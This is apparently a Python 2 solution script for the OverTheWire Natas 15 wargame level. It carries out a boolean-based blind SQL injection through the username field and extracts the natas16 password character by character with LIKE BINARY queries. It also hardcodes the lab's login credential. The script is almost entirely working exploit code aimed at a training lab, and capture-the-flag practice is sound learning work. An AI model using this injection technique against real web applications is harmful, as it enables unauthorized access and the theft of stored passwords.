#!/user/bin/python

import requests

URL = "http://natas15.natas.labs.overthewire.org/index.php"
USER = "natas15"
PASS = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnoprqstuvwxyz0123456789"
POSSIBLE = ""
KEY = ""

def check_existence(value):
    r = requests.post(URL, data = {'username':value}, auth = (USER,PASS))
    if 'This user exists.' in r.text:
        return True
        

def value_input():
    for char in CHARSET:
        if check_existence("natas16\" AND password LIKE BINARY \"%" + char + "%") is True:
            global POSSIBLE
            POSSIBLE += char

def get_key():
    for k in range(31):
        for char in POSSIBLE:
            global KEY
            if check_existence("natas16\" AND password LIKE BINARY \"" + KEY + char + "%") is True:
                KEY += char
                print KEY
                break

def main():
    value_input()
    get_key()
    print KEY

main()
